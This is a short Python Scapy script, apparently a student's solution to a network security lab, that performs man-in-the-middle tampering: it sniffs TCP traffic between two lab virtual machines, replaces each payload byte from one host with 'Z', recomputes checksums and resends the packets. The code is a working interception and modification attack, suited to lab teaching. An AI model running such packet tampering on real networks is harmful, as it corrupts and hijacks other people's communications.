#!/usr/bin/python3
from scapy.all import *

VM_A_IP = "10.0.2.7"
VM_B_IP = "10.0.2.15"

def spoof_pkt(pkt):
  if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
     # Create a new packet based on the captured one.
     # (1) We need to delete the checksum fields in the IP and TCP headers,
     # because our modification will make them invalid.
     # Scapy will recalculate them for us if these fields are missing.
     # (2) We also delete the original TCP payload.
     newpkt = IP(bytes(pkt[IP]))
     del(newpkt.chksum)
     del(newpkt[TCP].chksum)
     del(newpkt[TCP].payload)
#####################################################################
     # Construct the new payload based on the old payload.
     # Students need to implement this part.

     olddata = pkt[TCP].payload.load # Get the original payload data
     given_data = list(olddata) # Get old data to temp variable
     for i in range(0, len(given_data)):
	     given_data[i] = ord('Z'); #for each letter in the temp variable we change it to Z
     newdata = bytes(given_data);
#####################################################################
     # Attach the new data and set the packet out

     send(newpkt/newdata)

  elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
     send(pkt[IP]) # Forward the original packet

pkt = sniff(filter='tcp and not src 10.0.2.6',prn=spoof_pkt)
